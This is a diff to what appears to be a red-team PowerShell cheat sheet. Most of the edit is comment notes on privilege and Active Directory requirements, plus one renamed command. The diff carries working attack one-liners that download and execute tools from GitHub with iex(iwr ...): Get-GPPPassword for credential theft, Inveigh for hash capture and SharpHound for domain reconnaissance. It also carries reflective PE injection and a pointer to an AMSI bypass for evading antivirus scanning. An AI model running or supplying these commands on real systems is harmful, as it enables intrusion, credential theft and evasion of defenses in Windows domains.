@@ -16,7 +16,8 @@ https://github.com/PowerShellMafia/PowerSploit/blob/c722f89a29fe81b2e554de3b0310
 $PEBytes = Get-Content C:\Windows\System32\notepad.exe -Encoding Byte -Raw
 Invoke-ReflectivePEInjection -PEBytes $PEBytes -FuncReturnType WString
 
-# problems: requires domain joined
+# user context ok
+# requires AD Domain
 iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-GPPPassword.ps1 -usebasicparsing)
 
 # admin privs required
@@ -32,12 +33,14 @@ iex( iwr https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Re
 Get-NetLocalGroupMember
 
 # admin privs required
+# requires AD Domain to capture hashes
 iex( iwr https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1 -usebasicparsing)
 Invoke-Inveigh
 
 # user context ok
+# requires AD Domain
 iex( iwr https://github.com/BloodHoundAD/BloodHound/raw/master/Collectors/SharpHound.ps1 -usebasicparsing)
-Invoke-SharpHound
+Invoke-BloodHound
 
 # user context ok
 https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell (Copy First Method: Patch the providers DLL)
